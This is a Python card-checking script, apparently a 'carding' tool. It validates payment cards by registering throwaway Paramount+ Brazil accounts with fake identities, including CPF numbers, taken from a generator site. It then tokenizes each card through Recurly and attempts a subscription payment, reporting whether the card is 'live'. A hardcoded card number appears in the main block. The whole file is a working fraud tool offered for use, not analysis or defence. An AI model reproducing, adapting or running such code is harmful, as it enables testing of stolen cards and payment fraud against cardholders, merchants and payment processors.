import requests,time, json,os, sys
from deep_translator import GoogleTranslator

def corte(texto, inicio, final):
    
    if inicio in texto:
        if final in texto:
            texto = texto.split(inicio)[1].strip()
            texto = texto.split(final)[0].strip()
            return texto
        else:
            return 'final não encontrado'
    
    else:
        return 'inicio não encontrado'

def gerar_pessoa():

    headers = {
        'authority': 'www.4devs.com.br',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'content-type': 'application/x-www-form-urlencoded',
        'accept': '*/*',
        'origin': 'https://www.4devs.com.br',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://www.4devs.com.br/gerador_de_pessoas',
        'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    }

    data = {
    'acao': 'gerar_pessoa',
    'sexo': 'I',
    'pontuacao': 'N',
    'idade': '0',
    'cep_estado': '',
    'txt_qtde': '1',
    'cep_cidade': ''
    }

    response = requests.post('https://www.4devs.com.br/ferramentas_online.php', headers=headers, data=data)

    retorno = response.json()

    return retorno


def debito(cc):
	try:
		card = cc.split('|')
		card = {
            "cc":card[0],
            "mes":card[1],
            "ano":card[2],
            "cvv":card[3],
        }

		if len(card['ano']) == 2:
			card['ano'] = f"20{card['ano']}"
		
	except:
		return{
            "status":False,
            "live":False,
            "message": "Faltou algo no cartão",
        }

	session = requests.Session()

	headers = {
		'authority': 'www.paramountplus.com',
		'cache-control': 'max-age=0',
		'upgrade-insecure-requests': '1',
		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
		'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
		'sec-ch-ua-mobile': '?0',
		'sec-ch-ua-platform': '"Windows"',
		'sec-fetch-site': 'none',
		'sec-fetch-mode': 'navigate',
		'sec-fetch-user': '?1',
		'sec-fetch-dest': 'document',
		'accept-language': 'pt-PT,pt;q=0.9',
	}

	response = session.get('https://www.paramountplus.com/br/interstitial/1/', headers=headers)


	token_trp = corte(response.text, '"tk_trp":"', '"')

	public_key = corte(response.text, 'recurly_public_key = "', '"')

	code = corte (response.text,'"code":"' ,'"')


	while True:

		pessoa = gerar_pessoa()

		fetch = {
		"headers": {
			"accept": "application/json, text/plain, */*",
			"accept-language": "pt-PT,pt;q=0.9",
			"content-type": "multipart/form-data; boundary=----WebKitFormBoundaryNI0wcmDFRy1nVSCq",
			"sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"98\", \"Google Chrome\";v=\"98\"",
			"sec-ch-ua-mobile": "?0",
			"sec-ch-ua-platform": "\"Windows\"",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin",
			"x-requested-with": "XMLHttpRequest"
		},
		"referrer": "https://www.paramountplus.com/br/signup",
		"referrerPolicy": "strict-origin-when-cross-origin",
		"body": f"------WebKitFormBoundaryNI0wcmDFRy1nVSCq\r\nContent-Disposition: form-data; name=\"fullName\"\r\n\r\n{pessoa['nome']}\r\n------WebKitFormBoundaryNI0wcmDFRy1nVSCq\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\n{pessoa['email']}\r\n------WebKitFormBoundaryNI0wcmDFRy1nVSCq\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n{pessoa['senha']}\r\n------WebKitFormBoundaryNI0wcmDFRy1nVSCq\r\nContent-Disposition: form-data; name=\"optIn\"\r\n\r\nfalse\r\n------WebKitFormBoundaryNI0wcmDFRy1nVSCq\r\nContent-Disposition: form-data; name=\"requiredAgreement\"\r\n\r\ntrue\r\n------WebKitFormBoundaryNI0wcmDFRy1nVSCq\r\nContent-Disposition: form-data; name=\"tk_trp\"\r\n\r\n{token_trp}\r\n------WebKitFormBoundaryNI0wcmDFRy1nVSCq--\r\n",
		"method": "POST",
		"mode": "cors",
		"credentials": "include"
		}


		response = session.post('https://www.paramountplus.com/br/aa-app-xhr/register/', headers=fetch['headers'], data=fetch['body'])
		
		if response.json()['success'] == True:
			break



	headers = {
		'authority': 'api.recurly.com',
		'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
		'sec-ch-ua-mobile': '?0',
		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
		'sec-ch-ua-platform': '"Windows"',
		'content-type': 'application/x-www-form-urlencoded',
		'accept': '*/*',
		'origin': 'https://api.recurly.com',
		'sec-fetch-site': 'same-origin',
		'sec-fetch-mode': 'cors',
		'sec-fetch-dest': 'empty',
		'referer': 'https://api.recurly.com/js/v1/field.html',
		'accept-language': 'pt-PT,pt;q=0.9',
	}

	data = {
	'first_name': pessoa['nome'].split(' ')[0],
	'last_name': pessoa['nome'].split(' ')[-1],
	'address1': pessoa['endereco'],
	'city': pessoa['cidade'],
	'state': pessoa['estado'],
	'postal_code': pessoa['cep'],
	'tax_identifier': pessoa['cpf'],
	'tax_identifier_type': 'cpf',
	'country': 'BR',
	'token': '',
	'number': card['cc'],
	'browser[color_depth]': '24',
	'browser[java_enabled]': 'false',
	'browser[language]': 'pt-PT',
	'browser[referrer_url]': 'https://www.paramountplus.com/br/payment',
	'browser[screen_height]': '768',
	'browser[screen_width]': '1366',
	'browser[time_zone_offset]': '180',
	'browser[user_agent]': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
	'month': '08',
	'year': f"{card['ano']}",
	'cvv': card['cvv'],
	'risk[0][processor]': 'cybersource',
	'version': '4.18.0',
	'key': public_key,
	}

	response = session.post('https://api.recurly.com/js/v1/token', headers=headers, data=data)
	print(response.text)

	if 'id' in response.json():
		token_card = response.json()['id']

	else:
		message = str(GoogleTranslator(source='auto', target='pt').translate(response.json()['error']['message']).replace('.',''))

		return {
			"status": True,
			"live": False,
			"message": message,
		}

	fetch = {
	"headers": {
		"accept": "application/json, text/plain, */*",
		"accept-language": "pt-PT,pt;q=0.9",
		"content-type": "multipart/form-data; boundary=----WebKitFormBoundaryN4enuBbCw7PZxO6U",
		"sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"98\", \"Google Chrome\";v=\"98\"",
		"sec-ch-ua-mobile": "?0",
		"sec-ch-ua-platform": "\"Windows\"",
		"sec-fetch-dest": "empty",
		"sec-fetch-mode": "cors",
		"sec-fetch-site": "same-origin",
		"x-requested-with": "XMLHttpRequest"
	},
	"referrer": "https://www.paramountplus.com/br/payment",
	"referrerPolicy": "strict-origin-when-cross-origin",
	"body": f"------WebKitFormBoundaryN4enuBbCw7PZxO6U\r\nContent-Disposition: form-data; name=\"token\"\r\n\r\n{token_card}\r\n------WebKitFormBoundaryN4enuBbCw7PZxO6U\r\nContent-Disposition: form-data; name=\"m\"\r\n\r\n{int(time.time())}\r\n------WebKitFormBoundaryN4enuBbCw7PZxO6U\r\nContent-Disposition: form-data; name=\"i\"\r\n\r\n0\r\n------WebKitFormBoundaryN4enuBbCw7PZxO6U\r\nContent-Disposition: form-data; name=\"productType\"\r\n\r\nmonthly\r\n------WebKitFormBoundaryN4enuBbCw7PZxO6U\r\nContent-Disposition: form-data; name=\"productCode\"\r\n\r\n{code}\r\n------WebKitFormBoundaryN4enuBbCw7PZxO6U\r\nContent-Disposition: form-data; name=\"tk_trp\"\r\n\r\n{token_trp}\r\n------WebKitFormBoundaryN4enuBbCw7PZxO6U--\r\n",
	"method": "POST",
	"mode": "cors",
	"credentials": "include"
	}

	response = session.post("https://www.paramountplus.com/br/aa-app-xhr/processPayment/", headers=fetch['headers'], data=fetch['body'])
	
	# aprovado 
	#{"success":true,"order_id":"6086fdb654987a8772d53a4cd0a406df","tr":{"purchaseOrderRefNum":"6086fdb654987a8772d53a4cd0a406df","purchaseOrderId":"6086fdb654987a8772d53a4cd0a406df","purchaseTransactionId":"6086fdb654987a8772d53a4cd0a406df","purchaseEventOrderComplete":1,"purchasePaymentMethod":["credit card"],"purchasePromoCode":null,"userType":"SUBSCRIBER","userStatus":"tsb|14","userRegId":25933880,"purchaseCategory":["Paramount+ monthly - Brazil - Trial"],"purchaseProduct":["pplus_intl_br_monthly"],"purchaseProductName":["Paramount+ monthly - Brazil - Trial"],"purchaseQuantity":[1],"purchasePrice":[19.9],"productPricingPlan":["monthly"],"productOfferPeriod":["7-Dia trial"]}
	
	if response.status_code == 200:
		if response.json()['success'] == True:
			return {
				"status": True,
				"live": True,
				"message": "Gate3 Pagamento aprovado R$5,00",
			}

		else:
			message = str(GoogleTranslator(source='auto', target='pt').translate(response.json()['message'])).replace('.','')


			if message == "Falha na transação Entre em contato com o suporte para obter mais ajuda":
				message = "Gate 3 Pagamento Recusado"

			if message == "Sua transação foi recusada Use um cartão diferente ou entre em contato com seu banco":
				message = "Gate 3 Sua transação foi recusada"

			return {
				"status": True,
				"live": False,
				"message": message
			}

	else:
		return {
				"status": False,
				"live": False,
				"message": f"Erro {response.status_code}, Retorno desconhecido"
			}


if __name__ == "__main__":
    print(debito("5114770675184790|10|24|547"))
